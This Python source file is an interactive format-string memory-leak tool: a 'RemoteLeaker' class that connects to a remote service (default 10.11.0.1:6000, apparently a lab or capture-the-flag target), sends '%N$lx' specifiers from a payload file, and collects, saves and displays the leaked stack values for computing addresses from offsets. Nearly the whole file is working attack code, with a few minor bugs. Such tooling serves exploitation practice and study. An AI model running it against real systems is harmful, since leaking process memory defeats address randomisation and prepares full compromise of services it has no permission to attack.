import socket, time, struct, json, pickle
from datetime import datetime
from os import path, listdir, getcwd

class RemoteLeaker: 

    def __init__(self):
        """
            inputFile example)
            %26$lx
            %27$lx
            %28$lx
            %29$lx
        """
        self.hostname = None
        self.port = None
        self.inputFile = "stack_leak_payload.txt"                     # payload
        self.inputs = []
        self.connector = None
        self.memory = {}
        self.collection = {}
        self.load_input_file_to_list()


    def connect(self):
        """
            Connects to server
        """

        # Check for hardcoded
        rsp = input("Connect to 10.11.0.1:6000? (y/n) ")

        if rsp.lower() != "y":
                        
            # If not hardcoded, request info
            self.gather_connection_information()
        
        else:
            self.hostname = "10.11.0.1"
            self.port = 6000

        print(f"Connecting to {self.hostname}:{self.port}...")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((str(self.hostname), int(self.port)))
        
        except TimeoutError:
            print("TimeoutError. Restart the remote program?")
            return
        
        except ConnectionRefusedError:
            print("They hatin' and won't us connect. Trippin'...")
            return
            
        self.connector = s
        print("...Connected! ")
        data = s.recv(200)
        print(data)
        return

    def disconnect(self):
        if self.connector:
            self.connector.close()
            self.connector = None
            print("Disconnected...!")
        return

    def load_input_file_to_list(self):
        """
        Reads the input file and converts the format string payload into a list.

        :param filename: The name of the input file.
        :return: A list of format string specifiers.
        """
        try:
            
            with open(self.inputFile, "r") as file:
                # Read the file content
                content = file.read().strip()
                
                # Split by spaces to create a list
                self.inputs = content.split()
                
                return 
        
        except FileNotFoundError:
            print(f"Error: File '{self.inputFile}' not found.")
            return

        except Exception as e:
            print(f"An error occurred: {e}")
            return


    def leak(self, input):
        # Title: leak
        # Description: Sends input to a server and receives a response.
        # Assumptions: This assumes the input is formmated to leak the address, 
        # such inputs are "%" + num + "$lx"
        
        # Convert string to bytes1
        input = bytes(input.encode())
        self.connector.send(input)                                   # %26$lx
        leakedAddress = self.connector.recv(200) # A

        return leakedAddress


    def run_leak(self):
        """
            Take input file and run leak each input, output to dictionary
        """

        self.load_input_file_to_list()

        for input in self.inputs:

            leakedAddress = self.leak(input)

            # Format from bytes to strings for saving
            # This is probably stupid to keep switching types, 
            # but doing 
            self.collection[input] = leakedAddress

        return



    def calc(self, leakedAddress, offset):
        """
        Title: calc
        Description
        Asssumptions: offset is in byte form: 0x1b8.
        Use offset1
        
        """
        return int("0x" + leakedAddress, 16) - offset

    # Function to format and print memory data
    def print_memory(self):
        """
        Title: print_memory
        Description: displays the memory locations, pretty.
        Asssumptions: input is dictionary with the key memory location, and value stored in the value there. like durp.
        memory_data = {
            0x7c526fd670: 0x7c61c00880,
            0x7c526fd678: 0x206e,
        }
        """
        for address, value in self.memory_data.items():
            print(f"{address:#018x}:   {value:#018x}")

        return
    
    def save_collection(self, base_filename="remoteleaker"):

        # Generate timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        # Append timestamp to filename
        base_filename = f"{base_filename.split('.')[0]}_{timestamp}.pkl"

        # Write memory data to the file
        
        with open(base_filename, "wb") as f:
                pickle.dump(self.collection, f)
        
        print(f"Memory data written to: {base_filename}")
        
        return


    def determine_file_to_load(self, files):

        if not files:
            print("No files matching 'remoteleaker*.pkl' found in the current directory.")
            return

        # Get the most recent file
        most_recent_file = files[0]

        # Prompt the user to load the most recent file
        print(f"The most recent file is: {most_recent_file}")
        choice = input("Do you want to load the most recent file? (y/n): ").strip().lower()

        if choice == 'y':
            print("Loading...")
            return most_recent_file  # Return the most recent file

        # Display all matching files and let the user select
        print("\nAvailable files:")
        for idx, file in enumerate(files, start=1):
            creation_time = datetime.fromtimestamp(os.path.getctime(file)).strftime('%Y-%m-%d %H:%M:%S')
            print(f"{idx}: {file} (Created: {creation_time})")

        # User selects a file by number
        while True:
            try:
                selection = int(input("\nEnter the number of the file to load: "))
                
                if 1 <= selection <= len(files):
                    selected_file = files[selection - 1]
                    print(f"Loading {selected_file}...")
                    
                    return selected_file
                
                else:
                    print("Invalid selection. Please enter a number from the list.")

            except ValueError:
                print("Invalid input. Please enter a valid number.")


    def load_collection(self):
        """
        Loads a dictionary from a file and stores it in self.collection.

        :param filename: The name of the file to load the dictionary from.
        """


        files = self.find_remoteleaker_files()
        filename = self.determine_file_to_load(files)

        try:
            with open(filename, "rb") as file:  # Open the file in binary read mode
                self.collection = pickle.load(file)
                print(f"Dictionary loaded into self.collection from {filename}")
        
        except FileNotFoundError:
            print(f"Error: File '{filename}' not found.")
        
        except Exception as e:
            print(f"An error occurred while loading the dictionary: {e}")

        return

    def gather_connection_information(self):
        """
            Gather Hostname and port.
        """
        ans = "w"

        # Keep asking if it's correct until it is
        while ans.lower() != "y":
            hostname = input("Hostname: ")
            port = input("Port: ")
            print(f"Connect to: {hostname}:{port}")
            ans = input("Is this correct? (y/n) ")

        self.hostname = hostname
        self.port = int(port)

        return

    def find_remoteleaker_files(self):
        """
        Find all files in the current directory starting with "remoteleaker"
        and ending with "pkl", and return them sorted by creation time (newest first).
        """
        current_directory = getcwd()
        files = [
            f for f in listdir(current_directory)
            if f.startswith("remoteleaker") and f.endswith("pkl")
        ]
        # Sort files by creation time (newest first)
        files.sort(key=lambda x: path.getctime(x), reverse=True)

        return files


    def display_stack(self):
        """
        Displays the memory stack in a formatted structure.
        """
        print("---------------------- STACK ------------------------")

        # Convert the dictionary values into a list of integers
        stack_values = []
        for stack_value in self.collection.values():
            try:
                # Convert each value to an integer assuming it's hexadecimal
                stack_values.append(int(stack_value, 16))
            except ValueError:
                print(f"Error: Invalid stack value '{stack_value}'")

        # Print stack values in pairs
        for i in range(0, len(stack_values), 2):
            # Safely retrieve pairs (pad with 0 if odd number of values)
            value1 = stack_values[i]
            value2 = stack_values[i + 1] if i + 1 < len(stack_values) else 0
            print(f":   {value1:#018x}      {value2:#018x}")
            
        return

    def menu(self):
            """
            Display the menu and handle user choices.
            """
            while True:
                print("\n--- Memory Leak Tool Menu ---")
                print("1. Connect")
                print("2. Send single leak")
                print("3. Use input file to leak")
                print("4. Display Stack")
                print("5. Disconnect")
                print("6. Save collection")
                print("7. Load collection")
                print("8. Quit")

                choice = input("Enter your choice: ")

                if choice == "1":
                    self.connect()

                elif choice == "2":
                    resp = self.leak(input("input > "))
                    print(f"Response: {resp}")

                elif choice == "3":
                    self.run_leak()

                elif choice == "4":
                    self.display_stack()

                elif choice == "5":
                    self.disconnect()

                elif choice == "6":
                    self.save_collection()

                elif choice == "7":
                    self.load_collection()

                elif choice == "8":
                    print("Exiting...")

                    if self.connector:
                        self.connector.disconnect()

                    break

                else:
                    print("Invalid choice. Please try again.")

def main():

    re = RemoteLeaker()


    re.menu()
    """
    re.connector.close()
    re.load_collection('remoteleaker_20241120_222939.pkl')
    re.display_stack()
    re.run_leak()
    #except Exception as e:
    #    print(f"An error occurred: {e}")
    """
    return

if __name__ == "__main__":
    main()
